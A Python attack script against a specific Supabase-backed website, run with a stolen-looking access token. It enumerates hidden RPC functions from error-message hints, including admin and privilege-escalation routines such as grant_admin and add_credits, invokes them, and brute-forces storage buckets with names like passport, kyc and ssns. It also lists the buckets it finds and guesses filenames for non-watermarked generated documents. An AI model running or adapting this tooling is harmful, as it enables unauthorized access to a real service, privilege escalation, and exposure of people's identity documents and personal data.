#!/usr/bin/env python3
# Supabase-angle probe round 3: function-namespace hint graph, hidden storage buckets, generated-bucket probing
import json, re, time, urllib.request, urllib.error, urllib.parse, ssl

BASE = "https://cdn.onlyfakeai.ru"
PK = "<publishable-key>"
TOK = json.load(open("their_token.txt"))["access_token"]
UA = "Mozilla/5.0 (supa-angle-probe)"
ctx = ssl.create_default_context()
reqs = 0
funcs = {}

def call(method, path, headers=None, body=None, timeout=20, sleep=0.1):
    global reqs
    url = BASE + path
    h = {"apikey": PK, "User-Agent": UA}
    if headers: h.update(headers)
    data = None
    if body is not None:
        data = body if isinstance(body, bytes) else json.dumps(body).encode()
        h.setdefault("Content-Type", "application/json")
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout, context=ctx) as resp:
            txt = resp.read(4000).decode("utf-8", "replace"); st = resp.status; rh = dict(resp.headers)
    except urllib.error.HTTPError as e:
        txt = e.read(4000).decode("utf-8", "replace"); st = e.code; rh = dict(e.headers)
    except Exception as e:
        st, rh, txt = "ERR", {}, repr(e)
    reqs += 1
    time.sleep(sleep)
    return st, rh, txt

def hint_funcs(txt):
    return re.findall(r'Perhaps you meant to call the function public\.([A-Za-z0-9_]+(?:\([^)]*\))?)', txt)

curated = """
get_admin_credit_leaderboard get_admin_activity get_admin_activity_log get_admin_activity_stats
get_admin_stats get_admin_statistics get_admin_summary get_admin_dashboard get_admin_metrics
get_admin_counts get_admin_totals get_admin_logs get_admin_log get_admin_audit get_admin_audit_log
get_admin_users get_admin_user_list get_admin_list get_admin_emails get_admin_credits
get_admin_credit_stats get_admin_credit_history get_admin_payments get_admin_payment_stats
get_admin_plans get_admin_revenue get_admin_reports get_admin_api_keys get_admin_keys
get_admin_profiles get_admin_profile_stats get_admin_jobs get_admin_job_stats get_admin_leaderboard
get_credit_leaderboard get_credits_leaderboard get_leaderboard get_admin_credit_leaderboards
admin_credit_leaderboard admin_leaderboard credit_leaderboard leaderboard admin_activity_log
admin_activity admin_stats admin_dashboard admin_summary admin_metrics admin_counts admin_totals
admin_logs admin_audit_log admin_users admin_list admin_emails admin_credits admin_payments
admin_plans admin_revenue admin_reports admin_api_keys admin_profiles admin_jobs admin_leaderboard
get_analytics get_analytics_summary get_analytics_admin_activity get_admin_analytics
get_dashboard_stats get_dashboard get_stats get_statistics get_summary get_metrics get_counts
get_total_counts get_recent_activity get_job_status_counts get_jobs_time_series get_profiles_time_series
get_payment_assignments get_credit_purchases credit_tokens_after_payment cleanup_expired_payment_assignments
deduct_credits deduct_generation grant_plan_credits remove_watermark_and_deduct_token is_admin
get_flagged_users get_banned_users get_flagged get_bans get_banned get_ban_list
get_recent_jobs get_recent_profiles get_recent_users get_recent_activity_log get_recent_signups
get_total_profiles get_total_jobs get_total_users get_total_revenue get_total_payments
get_job_stats get_profile_stats get_user_stats get_worker_status get_server_status get_queue_status
get_worker_stats get_workers get_servers get_queue get_jobs_queue get_processing_jobs
set_user_role update_user_role change_user_role assign_role grant_role grant_admin set_admin
make_admin add_admin remove_admin revoke_admin promote_admin promote_user create_admin
set_profile_role update_profile_role admin_set_role admin_update_role admin_grant_role
set_admin_role update_admin_role change_admin_role grant_admin_role revoke_admin_role
update_profile update_user update_credits update_plan set_plan set_credits add_credits add_generations
grant_credits grant_generations grant_plan reset_credits reset_generations assign_plan apply_plan
change_plan deduct_token add_tokens remove_watermark log_admin_action record_admin_action
insert_admin_activity track_activity log_activity admin_add_credits admin_grant_plan
get_api_key_usage get_api_key_stats get_api_keys get_key_usage get_user_api_keys
get_profiles_with_emails get_profile_emails get_user_emails get_email_list get_all_profiles
get_all_users get_all_jobs
""".split()

print(f"== A1. curated hint probes: {len(curated)} ==")
for i, name in enumerate(sorted(set(curated))):
    st, rh, txt = call("GET", f"/rest/v1/rpc/{urllib.parse.quote(name)}?zz_probe=1")
    for f in hint_funcs(txt):
        base = f.split("(")[0]
        if base not in funcs:
            funcs[base] = f
            print(f"[hint] {name} -> {f}")
    if st in (200,204) and not hint_funcs(txt):
        print(f"[live?] {name} -> {st} {txt[:160]}")
    if i % 50 == 0: print(f"... {i}/{len(sorted(set(curated)))} funcs={len(funcs)}", flush=True)

print("\n== A2. mutations of harvested names ==")
muts = set()
for f in list(funcs):
    parts = f.split("_")
    for i in range(len(parts)):
        muts.add("_".join(parts[:i] + parts[i+1:]))
    for i in range(len(parts)):
        for r in ["admin","user","users","profile","profiles","credit","credits","plan","plans","total","totals","stats","activity","log","logs","key","keys","series","counts","count","leaderboard","dashboard","summary","metrics"]:
            muts.add("_".join(parts[:i] + [r] + parts[i+1:]))
    for pre in ["get_","admin_",""]:
        for suf in ["","_stats","_counts","_list","_log","_activity","_leaderboard"]:
            muts.add(pre + f + suf)
muts -= set(funcs)
muts = sorted(muts)
print(f"{len(muts)} mutation probes")
for i, name in enumerate(muts):
    st, rh, txt = call("GET", f"/rest/v1/rpc/{urllib.parse.quote(name)}?zz_probe=1")
    for f in hint_funcs(txt):
        base = f.split("(")[0]
        if base not in funcs:
            funcs[base] = f; print(f"[hint2] {name} -> {f}")
    if i % 100 == 0: print(f"... {i}/{len(muts)} funcs={len(funcs)}", flush=True)

print("\n== A3. per-function signature probes ==")
sig = {}
for base in sorted(funcs):
    st1, _, t1 = call("GET", f"/rest/v1/rpc/{base}?zz_a=1&zz_b=2")
    st2, _, t2 = call("GET", f"/rest/v1/rpc/{base}?p_zz_a=1&p_zz_b=2")
    st3, _, t3 = call("GET", f"/rest/v1/rpc/{base}?start_date=2026-01-01&end_date=2026-02-01&date_trunc_type=day&p_start=2026-01-01&p_end=2026-02-01")
    sig[base] = {"hint_zz": hint_funcs(t1), "hint_pzz": hint_funcs(t2), "hint_series": hint_funcs(t3),
                 "raw_zz": t1[:300], "raw_pzz": t2[:300], "raw_series": t3[:400]}
    print(f"{base}: zz={hint_funcs(t1)} pzz={hint_funcs(t2)} series={hint_funcs(t3)}")
    time.sleep(0.1)

print("\n== A4. callability (empty body + bogus body) ==")
inv = []
for base in sorted(funcs):
    st0, _, t0 = call("POST", f"/rest/v1/rpc/{base}", body={})
    st1, _, t1 = call("POST", f"/rest/v1/rpc/{base}", body={"zz_probe": 1})
    inv.append({"fn": base, "empty": st0, "bogus": st1, "empty_body": t0[:200], "bogus_body": t1[:240]})
    print(f"{base}: empty={st0} bogus={st1} :: {t0[:120]}")
json.dump({"funcs": funcs, "sig": sig, "inv": inv}, open("probe3_funcs.json","w"), indent=1)

# ---------- B. hidden storage buckets ----------
print("\n== B. storage bucket oracle (via public-object route) ==")
cands = """generated templates templates-public site-assets photos backgrounds portraits-public portraits id ids dl
passport passports residence residences product products media public avatars documents uploads files images
user-documents documents-generated exports backups private no-watermark no_watermark results output outputs renders
rendered previews thumbnails cache temp tmp admin system config secrets keys assets static blog template catalog
catalog-products originals sources source input inputs raw final signed del downloads download watermark watermarked
admin_exports payments invoices receipts kyc identity selfies landing promo banners product-images id-cards
driver-licenses residence-permits ssns ssn cards card documents-public user_uploads user_photos photo preview
job-files generated-files generated_documents generated-documents no-watermarks nowatermark documents-private
private-documents user-docs user-files job-outputs job_outputs result completed jobs-output
templates-private admin-docs admin_files reports exports-final archive archives store storage data db backup""".split()
probed = []
for b in sorted(set(cands)):
    st, rh, txt = call("GET", f"/storage/v1/object/public/{urllib.parse.quote(b)}/__probe_nonexistent__")
    kind = "missing" if "NoSuchBucket" in txt else ("EXISTS" if ("NoSuchKey" in txt or st in (200,206)) else "UNKNOWN")
    probed.append([b, st, kind, txt[:120]])
    if kind == "EXISTS": print(f"[bucket EXISTS] {b}")
print("existing:", [p[0] for p in probed if p[2]=="EXISTS"])
json.dump(probed, open("probe3_buckets.json","w"), indent=1)

print("\n== B2. anon list of discovered non-standard buckets ==")
known = {"photos","backgrounds","portraits-public","id","dl","passport","residence","product","templates","site-assets","generated"}
for b, st, kind, _ in probed:
    if kind == "EXISTS":
        st2, _, t2 = call("POST", f"/storage/v1/object/list/{urllib.parse.quote(b)}", body={"prefix":"","limit":20,"offset":0})
        print(f"list {b}: {st2} {t2[:400]}")

print("\n== B3. public filename probes in 'generated' bucket ==")
try:
    photos = [l.strip().split("/")[-1] for l in open("photos_all.txt", encoding="utf-8", errors="replace") if l.strip()]
    ms = [p.split("_")[0] for p in photos if p.endswith("_preview.png")][:6]
except Exception as e:
    ms = []; print("photos_all err", e)
print("sample job ids:", ms)
names = []
for m in ms:
    for suf in ["_document.png","_no_watermark.png","_result.png","_generated.png",".png","_final.png","_output.png","_doc.png","_no_watermark.jpg",".jpg"]:
        names.append(m + suf)
for n in names[:50]:
    st, rh, txt = call("GET", f"/storage/v1/object/public/generated/{urllib.parse.quote(n)}")
    body = "" if st == 200 else txt[:100]
    print(f"generated/{n}: {st} len={rh.get('Content-Length')} {body}")

print(f"\nTOTAL REQUESTS: {reqs}")
